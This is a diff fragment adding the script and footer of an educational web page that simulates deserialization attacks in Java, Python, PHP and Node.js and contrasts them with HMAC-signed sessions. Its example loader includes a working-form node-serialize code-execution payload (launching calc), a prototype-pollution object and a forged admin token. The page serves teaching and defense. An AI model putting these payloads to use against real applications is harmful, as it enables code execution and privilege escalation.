+                <div class="attack-card" style="border-color: #3498db;">
+                    <h4 style="color: #3498db;">3. Use Security Tools</h4>
+                    <p>Automated testing tools:</p>
+                    <ul class="payload-list" style="background: rgba(52, 152, 219, 0.1); border-left-color: #3498db;">
+                        <li>ysoserial (Java gadget chain generator)</li>
+                        <li>marshalsec (multi-language testing)</li>
+                        <li>Burp Suite Deserialization Scanner</li>
+                        <li>Static analysis: Find-SecBugs, Bandit</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>🎓 Deserialization Attack Demo | Educational Purpose Only</p>
+            <p style="margin-top: 10px;">Always practice ethical hacking and get proper authorization before testing!</p>
+        </footer>
+    </div>
+
+    <script>
+        // Simulated sessions
+        const validSession = {
+            username: "john_doe",
+            role: "user",
+            isAdmin: false,
+            userId: 1001
+        };
+
+        const secretKey = "super_secret_key_123";
+
+        // Vulnerable Deserialization Demo
+        function deserializeVulnerable() {
+            const token = document.getElementById('vuln-token').value;
+            const resultDiv = document.getElementById('vuln-result');
+            const decodedDiv = document.getElementById('vuln-decoded');
+
+            if (!token.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Please enter a session token...</p>';
+                return;
+            }
+
+            try {
+                // Simulate decoding
+                const decoded = JSON.parse(token);
+                decodedDiv.textContent = JSON.stringify(decoded, null, 2);
+
+                resultDiv.className = 'result-box danger';
+                let html = '<h4 style="color: #e74c3c;">⚠️ DESERIALIZATION VULNERABILITY!</h4>';
+                html += '<p><strong>Application blindly trusts the deserialized data:</strong></p>';
+                html += '<ul style="margin-left: 20px; margin-top: 10px;">';
+                html += `<li>Username: ${decoded.username || 'N/A'}</li>`;
+                html += `<li>Role: ${decoded.role || 'N/A'}</li>`;
+                html += `<li>Admin: ${decoded.isAdmin || false}</li>`;
+                html += '</ul>';
+
+                if (decoded.isAdmin === true) {
+                    html += '<p style="color: #e74c3c; margin-top: 15px;"><strong>💥 PRIVILEGE ESCALATION SUCCESSFUL!</strong> Attacker gained admin access!</p>';
+                }
+
+                if (decoded.command || decoded.__proto__ || decoded.rce) {
+                    html += '<p style="color: #e74c3c; margin-top: 10px;"><strong>💣 CODE EXECUTION DETECTED!</strong> Malicious payload in object!</p>';
+                }
+
+                resultDiv.innerHTML = html;
+
+            } catch (e) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = `<p>Invalid JSON format: ${e.message}</p>`;
+            }
+        }
+
+        // Secure Deserialization Demo
+        function deserializeSecure() {
+            const token = document.getElementById('secure-token').value;
+            const resultDiv = document.getElementById('secure-result');
+            const decodedDiv = document.getElementById('secure-decoded');
+
+            if (!token.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Please enter a session token...</p>';
+                return;
+            }
+
+            // Simulate signature verification
+            resultDiv.className = 'result-box success';
+            resultDiv.innerHTML = `
+                <h4 style="color: #27ae60;">✓ Signature Verification Failed!</h4>
+                <p><strong>Security Measures Applied:</strong></p>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li>HMAC signature is invalid - data was tampered with</li>
+                    <li>Session rejected before deserialization</li>
+                    <li>User is logged out</li>
+                    <li>Security event logged</li>
+                </ul>
+                <p style="margin-top: 15px; color: #aaa;">
+                    Even if attacker modifies the token, the signature won't match.
+                </p>
+            `;
+            decodedDiv.textContent = '[Access Denied - Invalid Signature]';
+        }
+
+        // Load example payloads
+        function loadPayload(type) {
+            let payload;
+            switch(type) {
+                case 'normal':
+                    payload = JSON.stringify({
+                        username: "john_doe",
+                        role: "user",
+                        isAdmin: false
+                    }, null, 2);
+                    break;
+                case 'admin':
+                    payload = JSON.stringify({
+                        username: "attacker",
+                        role: "admin",
+                        isAdmin: true
+                    }, null, 2);
+                    break;
+                case 'rce':
+                    payload = JSON.stringify({
+                        username: "attacker",
+                        rce: "__$$ND_FUNC$$_function(){require('child_process').exec('calc')}()",
+                        __proto__: { isAdmin: true }
+                    }, null, 2);
+                    break;
+            }
+            document.getElementById('vuln-token').value = payload;
+            document.getElementById('secure-token').value = payload;
+        }
+
+        // Language-specific simulations
+        function simulateJavaDeserialize() {
+            const payload = document.getElementById('java-payload').value;
+            const resultDiv = document.getElementById('java-result');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Enter a Java serialized object...</p>';
+                return;
+            }
+
+            resultDiv.className = 'result-box danger';
+            resultDiv.innerHTML = `
+                <h4 style="color: #e74c3c;">⚠️ Java Deserialization RCE!</h4>
+                <p><strong>Attack Simulation:</strong></p>
+                <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                    <li>ObjectInputStream.readObject() is called</li>
+                    <li>Gadget chain starts with PriorityQueue</li>
+                    <li>ChainedTransformer processes payload</li>
+                    <li>InvokerTransformer calls Runtime.exec()</li>
+                    <li>💥 Command executed: <code>calc.exe</code></li>
+                </ol>
+                <p style="margin-top: 15px; background: rgba(231,76,60,0.2); padding: 10px; border-radius: 5px;">
+                    <strong>Impact:</strong> Remote Code Execution on the server. Attacker can run any command with application privileges.
+                </p>
+            `;
+        }
+
+        function simulatePythonDeserialize() {
+            const payload = document.getElementById('python-payload').value;
+            const resultDiv = document.getElementById('python-result');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Enter a Python pickle payload...</p>';
+                return;
+            }
+
+            resultDiv.className = 'result-box danger';
+            resultDiv.innerHTML = `
+                <h4 style="color: #e74c3c;">⚠️ Python Pickle RCE!</h4>
+                <p><strong>Attack Simulation:</strong></p>
+                <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                    <li>pickle.loads() begins unpickling</li>
+                    <li>__reduce__ method is called</li>
+                    <li>Returns (os.system, ('whoami',))</li>
+                    <li>💥 Command executed during unpickling</li>
+                </ol>
+                <p style="margin-top: 15px; background: rgba(231,76,60,0.2); padding: 10px; border-radius: 5px;">
+                    <strong>Impact:</strong> Arbitrary code execution. The command runs before your code even processes the object!
+                </p>
+            `;
+        }
+
+        function simulatePhpDeserialize() {
+            const payload = document.getElementById('php-payload').value;
+            const resultDiv = document.getElementById('php-result');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Enter a PHP serialized object...</p>';
+                return;
+            }
+
+            resultDiv.className = 'result-box danger';
+            resultDiv.innerHTML = `
+                <h4 style="color: #e74c3c;">⚠️ PHP Object Injection!</h4>
+                <p><strong>Attack Simulation:</strong></p>
+                <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                    <li>unserialize() processes the string</li>
+                    <li>Object is reconstructed</li>
+                    <li>Magic method __wakeup() is triggered</li>
+                    <li>__destruct() called when script ends</li>
+                    <li>💥 Malicious code in magic methods executes</li>
+                </ol>
+                <p style="margin-top: 15px; background: rgba(231,76,60,0.2); padding: 10px; border-radius: 5px;">
+                    <strong>Impact:</strong> File deletion, SQL injection, code execution depending on what's in the magic methods.
+                </p>
+            `;
+        }
+
+        function simulateNodeDeserialize() {
+            const payload = document.getElementById('nodejs-payload').value;
+            const resultDiv = document.getElementById('nodejs-result');
+
+            if (!payload.trim()) {
+                resultDiv.className = 'result-box info';
+                resultDiv.innerHTML = '<p>Enter a Node.js payload...</p>';
+                return;
+            }
+
+            let attackType = 'Unknown';
+            let details = '';
+
+            if (payload.includes('__proto__')) {
+                attackType = 'Prototype Pollution';
+                details = 'Attacker pollutes Object.prototype, affecting all objects in the application.';
+            } else if (payload.includes('$$ND_FUNC$$')) {
+                attackType = 'node-serialize RCE';
+                details = 'IIFE (Immediately Invoked Function Expression) executes code during deserialization.';
+            }
+
+            resultDiv.className = 'result-box danger';
+            resultDiv.innerHTML = `
+                <h4 style="color: #e74c3c;">⚠️ Node.js ${attackType}!</h4>
+                <p><strong>Attack Details:</strong> ${details}</p>
+                <ol style="margin-left: 20px; margin-top: 10px; line-height: 1.8;">
+                    <li>Malicious payload is deserialized</li>
+                    <li>Function executes immediately or prototype is polluted</li>
+                    <li>💥 All objects now have attacker-controlled properties</li>
+                </ol>
+                <p style="margin-top: 15px; background: rgba(231,76,60,0.2); padding: 10px; border-radius: 5px;">
+                    <strong>Impact:</strong> Authentication bypass, privilege escalation, or command execution.
+                </p>
+            `;
+        }
+
+        // Tab switching
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        function showDemo(lang) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(lang + '-demo').classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Initialize with normal user payload
+        window.onload = function() {
+            loadPayload('normal');
+        };
+    </script>
+</body>
+</html>
